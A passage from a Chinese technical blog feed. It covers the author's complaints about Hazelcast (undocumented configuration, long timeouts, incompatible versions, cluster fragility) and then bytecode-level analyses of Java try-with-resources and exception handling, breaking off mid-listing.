<h2 id="坑爹事情"><a href="#坑爹事情" class="headerlink" title="坑爹事情"></a>坑爹事情</h2><h3 id="配置各种找不到"><a href="#配置各种找不到" class="headerlink" title="配置各种找不到"></a>配置各种找不到</h3><p>有很多xml的配置方式没有写在文档上，要到代码里各种找。友情提示，可以到代码里的test目录下找到比较完整的配置：</p>
<p><a href="https://github.com/hazelcast/hazelcast/blob/maintenance-3.x/hazelcast-spring/src/test/resources/com/hazelcast/spring/node-client-applicationContext-hazelcast.xml" target="_blank" rel="noopener">https://github.com/hazelcast/hazelcast/blob/maintenance-3.x/hazelcast-spring/src/test/resources/com/hazelcast/spring/node-client-applicationContext-hazelcast.xml</a></p>
<p>有很多参数的配置没有写在文档上，要到代码里各种找。友情提示，在com.hazelcast.instance.GroupProperties 这个类里找到一些在文档上没有的配置参数。</p>
<h3 id="默认的超时配置太长"><a href="#默认的超时配置太长" class="headerlink" title="默认的超时配置太长"></a>默认的超时配置太长</h3><p>很多超时配置都是上百秒的，试想现在的网站或者应用，有哪个可以忍受上百秒的超时。从另一个侧面也可以看出hazelcast的自己的信心不足，要靠超长时间的超时来保证运行的正确性。</p>
<p>即使配置了较短的超时时间，还是有可能会有各种出人意料的超时，认真研究过代码后，发现是有很多超时时间是在代码里写死的。。</p>
<h3 id="版本之间不兼容"><a href="#版本之间不兼容" class="headerlink" title="版本之间不兼容"></a>版本之间不兼容</h3><p>版本之间不兼容，不能滚动升级。这就意味着，当升级时，整个集群都要一块重启，这对很多网站来说，是不能忍受的。据说从3.1版本后会保证小版本的兼容性。</p>
<p><a href="https://github.com/hazelcast/hazelcast/issues/14" target="_blank" rel="noopener">https://github.com/hazelcast/hazelcast/issues/14</a></p>
<p>hazelcast里代码一大问题就是把序列化方案和网络通讯混在一起了，导致各种升级兼容问题。每个消息包在解析时，都有可能因为类有改动而不兼容。</p>
<p>而且序列化方案还是那种要实现一个特定接口的。在Protobuf，Thrift，及各种基于反射的序列化方案这么流行的今天，很难想像会有这样难用的序列化方式。</p>
<h3 id="一个结点出问题，影响整个集群"><a href="#一个结点出问题，影响整个集群" class="headerlink" title="一个结点出问题，影响整个集群"></a>一个结点出问题，影响整个集群</h3><p>当集群里某个节点出故障时，比如OOM，CPU100%，没反应之后，集群里发到那个结点的操作就各种超时，各种不正常。这个可以算是hazelcast的一个致命的缺点。</p>
<p>我们线上的集群有30多个结点，随便一个有问题，都会导致整个集群有问题。另外，当集群里有一个应用下线/上线，都会引起数据的迁移，尽管迁移是自动的，但是也是一个不可控的风险。</p>
<p>我们开始时用的是hazelcast2.5.1，后来升级到3.1.3版本。升级后发现两个结点间经常会有网络流量超高的情况，最后发现是merge-policy的配置在3.0只能配置类的全名，而在2.5是可以配置一个简称的。然后在集群里有数据要迁移，进行Merge时，就会因为ClassNotFoundException而失败。而Hazelcast坑爹的地方在于它不断地重试，而且是无停顿地重试，从而导致两个结点之间网络流量超高，甚至超过了100Mbps。</p>
<h3 id="hazelcast-client很难用"><a href="#hazelcast-client很难用" class="headerlink" title="hazelcast client很难用"></a>hazelcast client很难用</h3><p>首先，还是文档太少，很多配置根本没有提到，得自己到代码里去找。</p>
<p>另外，如果hazelcast server集群全部挂掉后，client居然不会自己重连（重试3次就放弃了）。现在的各种组件重启是很正常的事情，而hazelcast client居然不会自动重连，真心令人无语。更加扯蛋的是，比如map.get，如果没有连接上，会抛出一个RuntimeException，那么整个线程都退出了。</p>
<p>3.0版本和3.0.2版本之间的配置格式居然有很大的变化，很多时候，找个配置，得自己去看xml的xsd文件。。</p>
<h3 id="结点之间Merge时，需要反序列化"><a href="#结点之间Merge时，需要反序列化" class="headerlink" title="结点之间Merge时，需要反序列化"></a>结点之间Merge时，需要反序列化</h3><p>这个我认为是代码太多导致的混乱。结点之间数据合并时，本来只要比较下数据的版本，时间等就可以了，但是在合并时却把对象反序化出来。如果在Server端没有对应的jar包，则会抛出ClassNotFoundException。</p>
<p>参考这里：</p>
<p><a href="https://github.com/hazelcast/hazelcast/issues/1514" target="_blank" rel="noopener">https://github.com/hazelcast/hazelcast/issues/1514</a></p>
<h2 id="一些原理性的东东"><a href="#一些原理性的东东" class="headerlink" title="一些原理性的东东"></a>一些原理性的东东</h2><h3 id="Partition"><a href="#Partition" class="headerlink" title="Partition"></a>Partition</h3><p>从原理上来说，hazelcast是默认有271个partition，这271个parition平均分布在集群里的结点中，因此集群里的数据分散在每个结点中。然后在进行操作时，先计算得到key所在的partiion，再进行操作。</p>
<p>详细请参考PartitionServiceImpl这个类的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">getPartitionId</span><span class="params">(Data key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hash = key.getPartitionHash();</span><br><span class="line">    <span class="keyword">return</span> (hash != Integer.MIN_VALUE) ? Math.abs(hash) % partitionCount : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="NearCache的实现原理"><a href="#NearCache的实现原理" class="headerlink" title="NearCache的实现原理"></a>NearCache的实现原理</h3><p>hazelcast里有一个所谓的nearcache的东东，其实这个很简单，就是一个本地的二级缓存。在get的时候先到本地的nearcache里查找，如果没有计算hash，再到对应的结点中取数据，再放到nearcache里。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://www.oschina.net/p/hazelcast" target="_blank" rel="noopener">http://www.oschina.net/p/hazelcast</a></li>
<li><a href="http://www.hazelcast.org/docs/3.1/manual/html-single/" target="_blank" rel="noopener">http://www.hazelcast.org/docs/3.1/manual/html-single/</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>hazelcast</tag>
        <tag>serialization</tag>
      </tags>
  </entry>
  <entry>
    <title>Java7里try-with-resources分析</title>
    <url>/java-try-with-resources/</url>
    <content><![CDATA[<h2 id="Try-with-resources"><a href="#Try-with-resources" class="headerlink" title="Try with resources"></a>Try with resources</h2><p>这个所谓的try-with-resources，是个语法糖。实际上就是自动调用资源的close()函数。和Python里的with语句差不多。</p>
<p>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> String <span class="title">readFirstLineFromFile</span><span class="params">(String path)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> (BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(path))) &#123;</span><br><span class="line">        <span class="keyword">return</span> br.readLine();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到try语句多了个括号，而在括号里初始化了一个BufferedReader。<br>这种在try后面加个括号，再初始化对象的语法就叫try-with-resources。</p>
<p>实际上，相当于下面的代码（其实略有不同，下面会说明）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> String <span class="title">readFirstLineFromFileWithFinallyBlock</span><span class="params">(String path)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> FileReader(path));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> br.readLine();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (br != <span class="keyword">null</span>) br.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很容易可以猜想到，这是编绎器自动在try-with-resources后面增加了判断对象是否为null，如果不为null，则调用close()函数的的字节码。</p>
<p>只有实现了java.lang.AutoCloseable接口，或者java.io.Closable（实际上继随自java.lang.AutoCloseable）接口的对象，才会自动调用其close()函数。<br>有点不同的是java.io.Closable要求一实现者保证close函数可以被重复调用。而AutoCloseable的close()函数则不要求是幂等的。具体可以参考Javadoc。</p>
<p>下面从编绎器生成的字节码来分析下，try-with-resources到底是怎样工作的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TryStudy</span> <span class="keyword">implements</span> <span class="title">AutoCloseable</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">try</span>(TryStudy tryStudy = <span class="keyword">new</span> TryStudy())&#123;</span><br><span class="line">			System.out.println(tryStudy);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>TryStudy实现了AutoCloseable接口，下面来看下test函数的字节码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">test</span><span class="params">()</span>V <span class="keyword">throws</span> java/lang/Exception </span></span><br><span class="line"><span class="function">  TRYCATCHBLOCK L0 L1 L2 </span></span><br><span class="line"><span class="function">  TRYCATCHBLOCK L3 L4 L4 </span></span><br><span class="line"><span class="function"> L5</span></span><br><span class="line"><span class="function">  LINENUMBER 21 L5</span></span><br><span class="line"><span class="function">  ACONST_NULL</span></span><br><span class="line"><span class="function">  ASTORE 0</span></span><br><span class="line"><span class="function">  ACONST_NULL</span></span><br><span class="line"><span class="function">  ASTORE 1</span></span><br><span class="line"><span class="function"> L3</span></span><br><span class="line"><span class="function">  NEW TryStudy</span></span><br><span class="line"><span class="function">  DUP</span></span><br><span class="line"><span class="function">  INVOKESPECIAL TryStudy.&lt;init&gt; <span class="params">()</span>V</span></span><br><span class="line"><span class="function">  ASTORE 2</span></span><br><span class="line"><span class="function"> L0</span></span><br><span class="line"><span class="function">  LINENUMBER 22 L0</span></span><br><span class="line"><span class="function">  GETSTATIC java/lang/System.out : Ljava/io/PrintStream</span>;</span><br><span class="line">  ALOAD <span class="number">2</span></span><br><span class="line">  INVOKEVIRTUAL java/io/PrintStream.println (Ljava/lang/Object;)V</span><br><span class="line"> L1</span><br><span class="line">  LINENUMBER <span class="number">23</span> L1</span><br><span class="line">  ALOAD <span class="number">2</span></span><br><span class="line">  IFNULL L6</span><br><span class="line">  ALOAD <span class="number">2</span></span><br><span class="line">  INVOKEVIRTUAL TryStudy.close ()V</span><br><span class="line">  GOTO L6</span><br><span class="line"> L2</span><br><span class="line"> FRAME FULL [java/lang/Throwable java/lang/Throwable TryStudy] [java/lang/Throwable]</span><br><span class="line">  ASTORE <span class="number">0</span></span><br><span class="line">  ALOAD <span class="number">2</span></span><br><span class="line">  IFNULL L7</span><br><span class="line">  ALOAD <span class="number">2</span></span><br><span class="line">  INVOKEVIRTUAL TryStudy.close ()V</span><br><span class="line"> L7</span><br><span class="line"> FRAME CHOP <span class="number">1</span></span><br><span class="line">  ALOAD <span class="number">0</span></span><br><span class="line">  ATHROW</span><br><span class="line"> L4</span><br><span class="line"> FRAME SAME1 java/lang/Throwable</span><br><span class="line">  ASTORE <span class="number">1</span></span><br><span class="line">  ALOAD <span class="number">0</span></span><br><span class="line">  IFNONNULL L8</span><br><span class="line">  ALOAD <span class="number">1</span></span><br><span class="line">  ASTORE <span class="number">0</span></span><br><span class="line">  GOTO L9</span><br><span class="line"> L8</span><br><span class="line"> FRAME SAME</span><br><span class="line">  ALOAD <span class="number">0</span></span><br><span class="line">  ALOAD <span class="number">1</span></span><br><span class="line">  IF_ACMPEQ L9</span><br><span class="line">  ALOAD <span class="number">0</span></span><br><span class="line">  ALOAD <span class="number">1</span></span><br><span class="line">  INVOKEVIRTUAL java/lang/Throwable.addSuppressed (Ljava/lang/Throwable;)V</span><br><span class="line"> L9</span><br><span class="line"> FRAME SAME</span><br><span class="line">  ALOAD <span class="number">0</span></span><br><span class="line">  ATHROW</span><br><span class="line"> L6</span><br><span class="line">  LINENUMBER <span class="number">24</span> L6</span><br><span class="line"> FRAME CHOP <span class="number">2</span></span><br><span class="line">  RETURN</span><br><span class="line">  LOCALVARIABLE tryStudy LTryStudy; L0 L7 <span class="number">2</span></span><br><span class="line">  MAXSTACK = <span class="number">2</span></span><br><span class="line">  MAXLOCALS = <span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>从字节码里可以看出，的确是有判断tryStudy对象是否为null，如果不是null，则调用close函数进行资源回收。<br>再仔细分析，可以发现有一个Throwable.addSuppressed的调用，那么这个调用是什么呢？</p>
<p>其实，上面的字节码大概是这个样子的（当然，不完全是这样的，因为汇编的各种灵活的跳转用Java是表达不出来的）：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	TryStudy tryStudy = <span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		tryStudy = <span class="keyword">new</span> TryStudy();</span><br><span class="line">		System.out.println(tryStudy);</span><br><span class="line">	&#125;<span class="keyword">catch</span>(Throwable suppressedException) &#123;</span><br><span class="line">		<span class="keyword">if</span> (tryStudy != <span class="keyword">null</span>) &#123;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				tryStudy.close();</span><br><span class="line">			&#125;<span class="keyword">catch</span>(Throwable e) &#123;</span><br><span class="line">				e.addSuppressed(suppressedException);</span><br><span class="line">				<span class="keyword">throw</span> e;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">throw</span> suppressedException;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有点晕是吧，其实很简单。使用了try-with-resources语句之后，有可能会出现两个异常，一个是try块里的异常，一个是调用close函数里抛出的异常。<br>当然，平时我们写代码时，没有关注到。一般都是再抛出close函数里的异常，前面的异常被丢弃了。</p>
<p>如果在调用close函数时出现异常，那么前面的异常就被称为Suppressed Exceptions，因此Throwable还有个addSuppressed函数可以把它们保存起来，当用户捕捉到close里抛出的异常时，就可以调用Throwable.getSuppressed函数来取出close之前的异常了。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>使用try-with-resources的语法可以实现资源的自动回收处理，大大提高了代码的便利性，和mutil catch一样，是个好东东。</p>
<p>用编绎器生成的字节码的角度来看，try-with-resources语法更加高效点。</p>
<p>java.io.Closable接口要求一实现者保证close函数可以被重复调用，而AutoCloseable的close()函数则不要求是幂等的。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><p><a href="http://docs.oracle.com/javase/tutorial/essential/exceptions/tryResourceClose.html" target="_blank" rel="noopener">http://docs.oracle.com/javase/tutorial/essential/exceptions/tryResourceClose.html</a></p>
</li>
<li><p><a href="http://docs.oracle.com/javase/7/docs/api/java/lang/AutoCloseable.html" target="_blank" rel="noopener">http://docs.oracle.com/javase/7/docs/api/java/lang/AutoCloseable.html</a></p>
</li>
<li><p><a href="http://docs.oracle.com/javase/7/docs/api/java/io/Closeable.html" target="_blank" rel="noopener">http://docs.oracle.com/javase/7/docs/api/java/io/Closeable.html</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>exception</tag>
      </tags>
  </entry>
  <entry>
    <title>Java中异常Exception的实现的一些分析</title>
    <url>/java-exception/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近发现一个很有用的Eclipse插件：<a href="http://andrei.gmxhome.de/bytecode/，可以在Eclipse直接查看，调试Java的字节码。" target="_blank" rel="noopener">http://andrei.gmxhome.de/bytecode/，可以在Eclipse直接查看，调试Java的字节码。</a></p>
<p>顺带研究了下Java里异常的实现机制，还有JDK7里的mutil catch的实现原理。</p>
<h2 id="athrow指令"><a href="#athrow指令" class="headerlink" title="athrow指令"></a>athrow指令</h2><p>在JVM里实现异常的指令是athrow，指令的参考在这里：<a href="http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-6.html#jvms-6.5.athrow" target="_blank" rel="noopener">http://docs.oracle.com/javase/specs/jvms/se7/html/jvms-6.html#jvms-6.5.athrow</a></p>
<p>大段的英文就不粘贴过来了：）。</p>
<p>个人理解：JVM是基于所谓的栈帧的(stack frame)的，一个函数调用链就是一个个栈帧组成，当在一个栈里用athrow抛出异常时，JVM会搜索当前函数的异常处理表（参考下面的Class文件分析），如果有找到对应的异常处理的handler，则由这个handler来处理。如果没有，则清理当前栈，再回到上一层栈帧中处理。如果一层层栈帧回退，最终都没有找到Exception Handler，则线程终止。</p>
<p>下面贴点实际代码：</p>
<p>一个简单的函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testFunc</span><span class="params">(<span class="keyword">int</span> i)</span> <span class="keyword">throws</span> NamingException, XPathException, SQLException </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (i == <span class="number">3</span>) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> XPathException(<span class="string">""</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (i == <span class="number">4</span>) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> SQLException();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (i == <span class="number">5</span>) &#123;</span><br><span class="line">		<span class="keyword">throw</span> <span class="keyword">new</span> NamingException();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>前面提到的ByteCode插件给出的分析：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// access flags 0x1</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">testFunc</span><span class="params">(I)</span>V <span class="keyword">throws</span> javax/naming/NamingException javax/xml/xpath/XPathException java/sql/SQLException </span></span><br><span class="line"><span class="function">   L0</span></span><br><span class="line"><span class="function">    LINENUMBER 31 L0</span></span><br><span class="line"><span class="function">    ILOAD 1</span></span><br><span class="line"><span class="function">    ICONST_3</span></span><br><span class="line"><span class="function">    IF_ICMPNE L1</span></span><br><span class="line"><span class="function">   L2</span></span><br><span class="line"><span class="function">    LINENUMBER 32 L2</span></span><br><span class="line"><span class="function">    NEW javax/xml/xpath/XPathException</span></span><br><span class="line"><span class="function">    DUP</span></span><br><span class="line"><span class="function">    LDC ""</span></span><br><span class="line"><span class="function">    INVOKESPECIAL javax/xml/xpath/XPathException.&lt;init&gt;<span class="params">(Ljava/lang/String;)</span>V</span></span><br><span class="line"><span class="function">    ATHROW</span></span><br><span class="line"><span class="function">   L1</span></span><br><span class="line"><span class="function">    LINENUMBER 34 L1</span></span><br><span class="line"><span class="function">   FRAME SAME</span></span><br><span class="line"><span class="function">    ILOAD 1</span></span><br><span class="line"><span class="function">    ICONST_4</span></span><br><span class="line"><span class="function">    IF_ICMPNE L3</span></span><br><span class="line"><span class="function">   L4</span></span><br><span class="line"><span class="function">    LINENUMBER 35 L4</span></span><br><span class="line"><span class="function">    NEW java/sql/SQLException</span></span><br><span class="line"><span class="function">    DUP</span></span><br><span class="line"><span class="function">    INVOKESPECIAL java/sql/SQLException.&lt;init&gt;<span class="params">()</span>V</span></span><br><span class="line"><span class="function">    ATHROW</span></span><br><span class="line"><span class="function">   L3</span></span><br><span class="line"><span class="function">    LINENUMBER 37 L3</span></span><br><span class="line"><span class="function">   FRAME SAME</span></span><br><span class="line"><span class="function">    ILOAD 1</span></span><br><span class="line"><span class="function">    ICONST_5</span></span><br><span class="line"><span class="function">    IF_ICMPNE L5</span></span><br><span class="line"><span class="function">   L6</span></span><br><span class="line"><span class="function">    LINENUMBER 38 L6</span></span><br><span class="line"><span class="function">    NEW javax/naming/NamingException</span></span><br><span class="line"><span class="function">    DUP</span></span><br><span class="line"><span class="function">    INVOKESPECIAL javax/naming/NamingException.&lt;init&gt;<span class="params">()</span>V</span></span><br><span class="line"><span class="function">    ATHROW</span></span><br><span class="line"><span class="function">   L5</span></span><br><span class="line"><span class="function">    LINENUMBER 40 L5</span></span><br><span class="line"><span class="function">   FRAME SAME</span></span><br><span class="line"><span class="function">    RETURN</span></span><br><span class="line"><span class="function">   L7</span></span><br><span class="line"><span class="function">    LOCALVARIABLE <span class="keyword">this</span> LTest</span>; L0 L7 <span class="number">0</span></span><br><span class="line">    LOCALVARIABLE i I L0 L7 <span class="number">1</span></span><br><span class="line">    MAXSTACK = <span class="number">3</span></span><br><span class="line">    MAXLOCALS = <span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>如果对汇编有一定了解的话，可以很容易看到，在Java里，抛出一个异常真的是非常简单的：<br>先New一个异常对象，再把这个对象的引用放到栈顶，再用athrow指令抛出这个异常。</p>
<h2 id="catch块的实现"><a href="#catch块的实现" class="headerlink" title="catch块的实现"></a>catch块的实现</h2><p>那下面来看下，从指令层面，是如何处理这个异常的：</p>
<p>首先，处理这个异常的函数：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		testFunc(<span class="number">100</span>);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">		System.out.println(<span class="string">"11111"</span>);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (XPathException e) &#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">		System.out.println(<span class="string">"22222"</span>);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">		System.out.println(<span class="string">"33333"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ByteCode插件给出的分析：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// access flags 0x1</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="title">test</span><span class="params">()</span>V</span></span><br><span class="line"><span class="function">   TRYCATCHBLOCK L0 L1 L2 javax/naming/NamingException</span></span><br><span class="line"><span class="function">   TRYCATCHBLOCK L0 L1 L3 javax/xml/xpath/XPathException</span></span><br><span class="line"><span class="function">   TRYCATCHBLOCK L0 L1 L4 java/sql/SQLException</span></span><br><span class="line"><span class="function">  L0</span></span><br><span class="line"><span class="function">   LINENUMBER 44 L0</span></span><br><span class="line"><span class="function">   ALOAD 0</span></span><br><span class="line"><span class="function">   BIPUSH 100</span></span><br><span class="line"><span class="function">   INVOKEVIRTUAL Test.<span class="title">testFunc</span><span class="params">(I)</span>V</span></span><br><span class="line"><span class="function">  L1</span></span><br><span class="line"><span class="function">   LINENUMBER 45 L1</span></span><br><span class="line"><span class="function">   GOTO L5</span></span><br><span class="line"><span class="function">  L2</span></span><br><span class="line"><span class="function">  FRAME SAME1 javax/naming/NamingException</span></span><br><span class="line"><span class="function">   ASTORE 1</span></span><br><span class="line"><span class="function">  L6</span></span><br><span class="line"><span class="function">   LINENUMBER 47 L6</span></span><br><span class="line"><span class="function">   GETSTATIC java/lang/System.out : Ljava/io/PrintStream</span>;</span><br><span class="line">   LDC <span class="string">"11111"</span></span><br><span class="line">   INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V</span><br><span class="line">  L7</span><br><span class="line">   GOTO L5</span><br><span class="line">  L3</span><br><span class="line">   LINENUMBER <span class="number">48</span> L3</span><br><span class="line">  FRAME SAME1 javax/xml/xpath/XPathException</span><br><span class="line">   ASTORE <span class="number">1</span></span><br><span class="line">  L8</span><br><span class="line">   LINENUMBER <span class="number">50</span> L8</span><br><span class="line">   GETSTATIC java/lang/System.out : Ljava/io/PrintStream;</span><br><span class="line">   LDC <span class="string">"22222"</span></span><br><span class="line">   INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V</span><br><span class="line">  L9</span><br><span class="line">   GOTO L5</span><br><span class="line">  L4</span><br><span class="line">   LINENUMBER <span class="number">51</span> L4</span><br><span class="line">  FRAME SAME1 java/sql/SQLException</span><br><span class="line">   ASTORE <span class="number">1</span></span><br><span class="line">  L10</span><br><span class="line">   LINENUMBER <span class="number">53</span> L10</span><br><span class="line">   GETSTATIC java/lang/System.out : Ljava/io/PrintStream;</span><br><span class="line">   LDC <span class="string">"33333"</span></span><br><span class="line">   INVOKEVIRTUAL java/io/PrintStream.println(Ljava/lang/String;)V</span><br><span class="line">  L5</span><br><span class="line">   LINENUMBER <span class="number">55</span> L5</span><br><span class="line">  FRAME SAME</span><br><span class="line">   RETURN</span><br><span class="line">  L11</span><br><span class="line">   LOCALVARIABLE <span class="keyword">this</span> LTest; L0 L11 <span class="number">0</span></span><br><span class="line">   LOCALVARIABLE e Ljavax/naming/NamingException; L6 L7 <span class="number">1</span></span><br><span class="line">   LOCALVARIABLE e Ljavax/xml/xpath/XPathException; L8 L9 <span class="number">1</span></span><br><span class="line">   LOCALVARIABLE e Ljava/sql/SQLException; L10 L5 <span class="number">1</span></span><br><span class="line">   MAXSTACK = <span class="number">2</span></span><br><span class="line">   MAXLOCALS = <span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>可以看到最开始部分有三条TRYCATCHBLOCK，再分析下这些TRYCATCHBLOCK后面跟着三个标签，最后还有一个异常的名字，再仔细分析下，可以发现三个标签分别对应try块开始的地方，try块结束的地方，catch块开始的地方。这个实际上就是所谓的Execption Table。</p>
<h2 id="class文件格式分析"><a href="#class文件格式分析" class="headerlink" title="class文件格式分析"></a>class文件格式分析</h2><p>另外，在Class文件的格式里，我们也可以看到Method的Execption Table。可以看出一个条目有四个元素组成：</p>
<p>start_pc, end_pc, handler_pc, catch_type。显然这些异常表里的数据是和代码位置有关的，和我们上面看到的一致。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Code_attribute &#123;</span><br><span class="line">    u2 attribute_name_index;</span><br><span class="line">    u4 attribute_length;</span><br><span class="line">    u2 max_stack;</span><br><span class="line">    u2 max_locals;</span><br><span class="line">    u4 code_length;</span><br><span class="line">    u1 code[code_length];</span><br><span class="line">    u2 exception_table_length;</span><br><span class="line">    &#123;   u2 start_pc;</span><br><span class="line">        u2 end_pc;</span><br><span class="line">        u2 handler_pc;</span><br><span class="line">        u2 catch_type;</span><br><span class="line">    &#125; exception_table[exception_table_length];</span><br><span class="line">    u2 attributes_count;</span><br><span class="line">    attribute_info attributes[attributes_count];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以，我们可以看到，test()函数调用了testFunc()函数，那么，当testFunc()函数里抛出异常时，JVM先回退到test()函数的栈帧，再从Execption Table里查找是否有合适的Execption Hanler，查找首先当前的pc(program counter)要在start_pc, end_pc之间，而且异常的名字要匹配（当然这个应该会被优化成常量的比较，即一个long的比较，不会真的去比较字符串）。如果找到，则跳到对应的handler_pc处继续执行。</p>
<h2 id="finally块的实现"><a href="#finally块的实现" class="headerlink" title="finally块的实现"></a>finally块的实现</h2><p>下面再来看下Finally块到底是怎么实现的：</p>
<p>在代码里增加finally块：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		testFunc(<span class="number">100</span>);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">		System.out.println(<span class="string">"11111"</span>);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (XPathException e) &#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">		System.out.println(<span class="string">"22222"</span>);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated catch block</span></span><br><span class="line">		System.out.println(<span class="string">"33333"</span>);</span><br><span class="line">	&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">		System.out.println(<span class="string">"xxxxxxxxxxxx"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ByteCode插件的分析：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// access flags 0x1</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">test2</span><span class="params">()</span>V</span></span><br><span class="line"><span class="function">    TRYCATCHBLOCK L0 L1 L2 javax/naming/NamingException</span></span><br><span class="line"><span class="function">    TRYCATCHBLOCK L0 L1 L3 javax/xml/xpath/XPathException</span></span><br><span class="line"><span class="function">    TRYCATCHBLOCK L0 L1 L4 java/sql/SQLException</span></span><br><span class="line"><span class="function">    TRYCATCHBLOCK L0 L5 L6 </span></span><br><span class="line"><span class="function">    TRYCATCHBLOCK L3 L7 L6 </span></span><br><span class="line"><span class="function">    TRYCATCHBLOCK L4 L8 L6 </span></span><br><span class="line"><span class="function">   L0</span></span><br><span class="line"><span class="function">    LINENUMBER 60 L0</span></span><br><span 